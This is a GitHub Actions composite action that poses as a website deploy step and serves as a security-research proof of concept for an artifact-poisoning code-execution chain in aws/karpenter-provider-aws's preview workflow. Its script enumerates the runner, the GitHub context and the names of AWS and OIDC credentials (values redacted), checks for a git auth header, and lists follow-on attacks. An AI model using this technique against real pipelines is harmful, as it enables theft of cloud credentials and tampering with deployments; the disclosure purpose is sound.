name: 'Deploy Website - Security Research PoC'
description: 'Proves LOTP code execution via artifact poisoning chain'
inputs:
  role:
    description: 'AWS IAM role ARN'
    required: true
  region:
    description: 'AWS region'
    required: true
  amplify-app-id:
    description: 'Amplify App ID'
    required: true
  amplify-branch-name:
    description: 'Amplify branch'
    required: true
  s3-bucket:
    description: 'S3 bucket'
    required: true
  s3-prefix:
    required: false
    default: ''
  hugo-base-url:
    required: false
    default: ''
runs:
  using: 'composite'
  steps:
    - name: Security Research PoC - Code Execution Proof
      shell: bash
      run: |
        echo "============================================================"
        echo "  SECURITY RESEARCH: LOTP via artifact poisoning chain"
        echo "  Target: aws/karpenter-provider-aws"
        echo "  Workflow: website-preview.yaml"
        echo "  Author: Robert Prast - Authorized security research"
        echo "============================================================"
        echo ""
        echo "[1] Code execution confirmed from fork checkout"
        echo "    Working directory: $(pwd)"
        echo "    Current user: $(whoami)"
        echo "    Hostname: $(hostname)"
        echo ""
        echo "[2] GitHub Context:"
        echo "    GITHUB_REPOSITORY: $GITHUB_REPOSITORY"
        echo "    GITHUB_RUN_ID: $GITHUB_RUN_ID"
        echo "    GITHUB_ACTOR: $GITHUB_ACTOR"
        echo "    GITHUB_WORKFLOW: $GITHUB_WORKFLOW"
        echo "    GITHUB_EVENT_NAME: $GITHUB_EVENT_NAME"
        echo ""
        echo "[3] AWS Credential Check (names only, values redacted):"
        env | grep -iE '^(AWS_|ACTIONS_ID_TOKEN)' | sed 's/=.*/=[REDACTED]/' || echo "    No AWS vars found"
        echo ""
        echo "[4] Action inputs received:"
        echo "    role: ${{ inputs.role }}"
        echo "    region: ${{ inputs.region }}"
        echo "    amplify-app-id: ${{ inputs.amplify-app-id }}"
        echo "    amplify-branch-name: ${{ inputs.amplify-branch-name }}"
        echo "    s3-bucket: ${{ inputs.s3-bucket }}"
        echo ""
        echo "[5] OIDC Token Request Check:"
        if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
          echo "    OIDC token endpoint: AVAILABLE"
          echo "    This means AWS IAM role assumption via OIDC would succeed"
        else
          echo "    OIDC token endpoint: NOT AVAILABLE"
        fi
        echo ""
        echo "[6] Git credential check:"
        git config --get http.https://github.com/.extraheader > /dev/null 2>&1 && echo "    Git auth header: PRESENT" || echo "    Git auth header: NOT FOUND"
        echo ""
        echo "============================================================"
        echo "  PoC COMPLETE - Arbitrary code execution proven"
        echo "  In a real attack, this action could:"
        echo "  - Assume the AWS IAM role via OIDC"
        echo "  - Deploy malicious content to Amplify"
        echo "  - Modify S3 bucket contents"
        echo "  - Exfiltrate secrets from the runner"
        echo "============================================================"
